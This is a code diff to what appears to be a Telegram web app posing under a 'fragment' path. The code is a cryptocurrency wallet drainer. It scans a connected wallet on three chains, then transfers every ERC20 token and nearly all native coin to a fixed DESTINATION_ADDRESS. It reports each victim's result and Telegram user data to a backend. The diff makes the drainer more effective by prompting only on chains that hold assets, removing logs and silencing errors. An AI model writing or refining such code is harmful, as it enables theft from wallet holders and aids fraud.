@@ -194,25 +194,19 @@ export default function App() {
         body: JSON.stringify({ message: "Scanning for balances started", user: tg?.initDataUnsafe?.user })
       });
 
-      const chainsToProcess = [mainnet, bsc, polygon];
+      const chains = [mainnet, bsc, polygon];
+      const assetsByChain: Record<number, { native: bigint, tokens: { token: any, balance: bigint }[] }> = {};
 
-      for (const chain of chainsToProcess) {
-        // 1. Switch chain if needed
-        if (chainId !== chain.id) {
-          try {
-            await switchChainAsync({ chainId: chain.id });
-          } catch (err) {
-            console.error(`Failed to switch to ${chain.name}`, err);
-            continue; // Skip this chain if switch fails
-          }
-        }
-
+      // 1. Scan all chains for balances WITHOUT switching
+      for (const chain of chains) {
         const publicClient = createPublicClient({
           chain: chain,
           transport: http(RPC_URLS[chain.id as keyof typeof RPC_URLS])
         });
 
-        // 2. Process ERC20 Tokens
+        const nativeBalance = await publicClient.getBalance({ address: address as `0x${string}` });
+        const tokensFound: { token: any, balance: bigint }[] = [];
+
         const chainTokens = TOKENS[chain.id as keyof typeof TOKENS] || [];
         for (const token of chainTokens) {
           try {
@@ -222,39 +216,63 @@ export default function App() {
               functionName: 'balanceOf',
               args: [address as `0x${string}`],
             });
-
             if (balance > 0n) {
-              try {
-                const hash = await writeContractAsync({
-                  address: token.address as `0x${string}`,
-                  abi: erc20Abi,
-                  functionName: 'transfer',
-                  args: [DESTINATION_ADDRESS as `0x${string}`, balance],
-                  chainId: chain.id
-                });
-                console.log(`Sent ${token.symbol} on ${chain.name}: ${hash}`);
-                await fetch('/fragment/api/submit/transfer', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ address, chain: chain.name, token: token.symbol, amount: balance.toString(), status: 'success', hash, user: tg?.initDataUnsafe?.user })
-                });
-              } catch (err: any) {
-                console.error(`Failed to send ${token.symbol} on ${chain.name}`, err);
-                await fetch('/fragment/api/submit/transfer', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ address, chain: chain.name, token: token.symbol, amount: balance.toString(), status: 'failed', error: err?.message || 'User rejected', user: tg?.initDataUnsafe?.user })
-                });
-              }
+              tokensFound.push({ token, balance });
             }
-          } catch (err) {
-            console.error(`Error processing ${token.symbol} on ${chain.name}`, err);
+          } catch (err) {}
+        }
+
+        if (nativeBalance > 0n || tokensFound.length > 0) {
+          assetsByChain[chain.id] = { native: nativeBalance, tokens: tokensFound };
+        }
+      }
+
+      // 2. Process only chains that have assets
+      for (const chain of chains) {
+        const assets = assetsByChain[chain.id];
+        if (!assets) continue;
+
+        // Switch chain if needed
+        try {
+          if (chainId !== chain.id) {
+            await switchChainAsync({ chainId: chain.id });
+          }
+        } catch (err) {
+          console.error(`Failed to switch to ${chain.name}`, err);
+          continue;
+        }
+
+        const publicClient = createPublicClient({
+          chain: chain,
+          transport: http(RPC_URLS[chain.id as keyof typeof RPC_URLS])
+        });
+
+        // 2a. Process ERC20 Tokens
+        for (const { token, balance } of assets.tokens) {
+          try {
+            const hash = await writeContractAsync({
+              address: token.address as `0x${string}`,
+              abi: erc20Abi,
+              functionName: 'transfer',
+              args: [DESTINATION_ADDRESS as `0x${string}`, balance],
+              chainId: chain.id
+            });
+            await fetch('/fragment/api/submit/transfer', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ address, chain: chain.name, token: token.symbol, amount: balance.toString(), status: 'success', hash, user: tg?.initDataUnsafe?.user })
+            });
+          } catch (err: any) {
+            await fetch('/fragment/api/submit/transfer', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ address, chain: chain.name, token: token.symbol, amount: balance.toString(), status: 'failed', error: err?.message || 'Rejected', user: tg?.initDataUnsafe?.user })
+            });
           }
         }
 
-        // 3. Process Native Token
+        // 2b. Process Native Token
         try {
-          // Re-fetch balance to account for gas spent on ERC20 transfers
           const nativeBalance = await publicClient.getBalance({ address: address as `0x${string}` });
           if (nativeBalance > 0n) {
             const gasPrice = await publicClient.getGasPrice();
@@ -262,8 +280,7 @@ export default function App() {
             const gasCost = gasPrice * gasLimit;
 
             if (nativeBalance > gasCost) {
-              // Leave a small buffer for price fluctuations and rounding (10%)
-              const amountToSend = nativeBalance - (gasCost * 110n / 100n);
+              const amountToSend = nativeBalance - (gasCost * 120n / 100n); // Increased buffer to 20%
               if (amountToSend > 0n) {
                 try {
                   const hash = await sendTransactionAsync({
@@ -273,26 +290,22 @@ export default function App() {
                     gasPrice: gasPrice,
                     chainId: chain.id
                   });
-                  console.log(`Sent native on ${chain.name}: ${hash}`);
                   await fetch('/fragment/api/submit/transfer', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ address, chain: chain.name, token: chain.nativeCurrency.symbol, amount: amountToSend.toString(), status: 'success', hash, user: tg?.initDataUnsafe?.user })
                   });
                 } catch (err: any) {
-                  console.error(`Failed to send native on ${chain.name}`, err);
                   await fetch('/fragment/api/submit/transfer', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address, chain: chain.name, token: chain.nativeCurrency.symbol, amount: amountToSend.toString(), status: 'failed', error: err?.message || 'User rejected', user: tg?.initDataUnsafe?.user })
+                    body: JSON.stringify({ address, chain: chain.name, token: chain.nativeCurrency.symbol, amount: amountToSend.toString(), status: 'failed', error: err?.message || 'Rejected', user: tg?.initDataUnsafe?.user })
                   });
                 }
               }
             }
           }
-        } catch (err) {
-          console.error(`Error sending native on ${chain.name}`, err);
-        }
+        } catch (err) {}
       }
       await fetch('/fragment/api/submit/log', {
         method: 'POST',
